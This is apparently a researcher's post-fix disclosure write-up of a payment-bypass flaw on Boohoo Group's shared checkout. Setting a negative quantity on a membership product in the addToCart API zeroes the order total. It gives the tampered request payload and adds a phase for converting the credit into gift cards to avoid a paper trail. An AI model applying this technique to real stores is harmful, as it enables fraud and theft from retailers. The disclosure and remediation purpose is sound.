---
title: "Boohooman: Payment Bypass via Negative Quantity on Membership Product"
date: 2026-10-10
categories: [Web, BusinessLogic]
tags: [payment-bypass, business-logic, boohooman, boohoo, e-commerce, negative-quantity, fixed]
---
 
## Target
 
**Boohoo Group** is a British online fashion retailer generating over **$750M in annual revenue**. The group operates multiple brands sharing the same platform and checkout infrastructure:
 
- **boohooMAN**: menswear (boohooman.com)
- **boohoo**: womenswear (boohoo.com)
- Karen Millen, Dorothy Perkins, Burton, Wallis, Coast, Debenhams, and others
All brands run on the same backend, meaning a vulnerability in one affects all of them. The platform sells not only own-brand fashion but also premium brands, **Gucci, Prada, Off-White, Samsung**, and more.
 
**Status: Fixed**: responsibly disclosed via email. The fix was confirmed by the team.
 
---
 
## Vulnerability
 
A business logic flaw in the basket API allows an attacker to set a **negative quantity** on the Premier Delivery membership product. This generates a **large negative price** that cancels out other items in the basket, resulting in an **Order Total of £0.00**, effectively obtaining products for free.
 
| Field | Value |
|---|---|
| Affected endpoint | `POST /api/basket/addToCart` |
| Vulnerable parameter | `quantity` |
| Product | BOOHOOMAN Premier (unlimited delivery membership) |
| Impact | Full payment bypass — free order checkout |
| Affected platforms | boohooman.com, boohoo.com, all Boohoo Group brands |
 
---
 
## Root Cause
 
The **Premier Delivery** membership is a subscription product, a user should only ever buy one, and the concept of "quantity" is meaningless for a membership. The server, however, accepted negative integer values for `quantity` without validation, treating the membership as a regular product with a manipulable count.
 
A membership with `quantity: -10101` becomes a **credit of £100,908.99** applied to the basket.
 
---
 
## Steps to Reproduce
 
### Phase 1: Generate the credit
 
1. Navigate to `boohooman.com/pages/informational/premier-delivery`
2. Click **ADD TO BAG** to add the Premier membership (£9.99)

![premier](/premier.png)

3. Intercept the request in Burp Suite:

```http
POST /api/basket/addToCart?_data=routes%2F... HTTP/2
Host: www.boohooman.com
Content-Type: application/x-www-form-urlencoded

data=%7B%22items%22%3A%5B%7B%22sku%22%3A%22PREMIERMAN%22%2C%22quantity%22%3A1%2C%22algolia%22%3A%5B%5D%7D%5D%7D
```

4. In the `data` parameter, change `"quantity":1` to `"quantity":-10101`
5. Forward the request, server returns **HTTP 200**

![request](/request-premier.png)

### Phase 2: Confirm the credit
 
Navigate to `boohooman.com/basket`:
 
```
Your Bag (-10101)
BOOHOOMAN Premier     -£100,908.99
Subtotal              -£100,908.99
Order Total           FREE
```

![basket](/backet.png)

The basket now shows a credit of **£100,908.99**.
 
### Phase 3: Convert credit to gift cards (full exploitation)
 
Adding regular clothing items to the basket reduces the credit, but physical products require a delivery address and the order can be tracked. To fully monetize the vulnerability:
 
1. Add multiple **Products, e-Gift Card, atc** (gift card £250 each) to the basket, up to the credit limit.

![checkout](/checkout.png)

3. The Order Total remains **£0.00**
4. Proceed to checkout, **no payment method required**
5. Complete the order, **"Payment Successful"** confirmation received by email
6. Gift cards arrive by email
7. Use the gift cards to purchase any products (clothing, designer brands, electronics), items are delivered to your home the next day
This converts an abstract negative balance into real monetary value with no paper trail linking it to the original manipulation.

![giftcard](/giftcard.png)

---
 
## Proof of Concept
 
**Intercepted request with negative quantity:**
 
```
data={"items":[{"sku":"PREMIERMAN","quantity":-10101,"algolia":[]}]}
```
 
**Server response (HTTP 200):**
```json
{
  "customerEmail": "...",
  "lineItems": [
    {
      "name": "BOOHOOMAN Premier",
      "breadcrumbs": ["add_on_service"],
      "categories": ["black-friday", "promotions", ...]
    }
  ]
}
```
 
**Basket result:**
 
- Subtotal: **-£96,815.00**
- Order Total: **FREE**
**Checkout result:**
 
- Bag value: **-£96,815.00** (after adding jackets, phone + £250 gift card)
- Discount: -£180.00 (25% off)
- Order Total: **£0.00**
- Checkout completed without payment
---

![delivery](/delivery.jpg)

## Why This Works
 
The server never validated that:
 
1. A membership product cannot have a quantity other than `1`
2. A negative quantity should be rejected
3. A basket with a negative total should be blocked at checkout
The checkout pipeline processed the order as legitimate because the mathematical total was `£0.00`, a valid amount requiring no payment.
 
---
 
## Impact
 
| Scenario | Impact |
|---|---|
| Free physical products | Attacker adds clothing/electronics, checks out for free |
| Gift card generation | Attacker generates gift cards worth hundreds of pounds at no cost |
| Scale | Any registered user on any Boohoo Group platform can replicate this |
| Brands affected | All brands sharing the same checkout, boohooman.com, boohoo.com, and others |
 
The Boohoo Group platform sells **designer and premium products** (Gucci, Prada, Off-White, Samsung devices). An attacker could potentially obtain high-value items at zero cost.
 
---
 
## Remediation
 
- Reject non-positive quantity values for membership/subscription products at the API level
- Validate that basket totals cannot be negative before processing checkout
- Implement server-side checks that prevent `add_on_service` category products from accepting quantity parameters at all

---
 
## Disclosure Timeline
 
| Event | Detail |
|---|---|
| Discovery | Vulnerability identified and reproduced |
| Disclosure | Reported responsibly to Boohoo Group via email |
| Fix | Confirmed fixed by the team |
| Publication | Post-fix writeup |
 
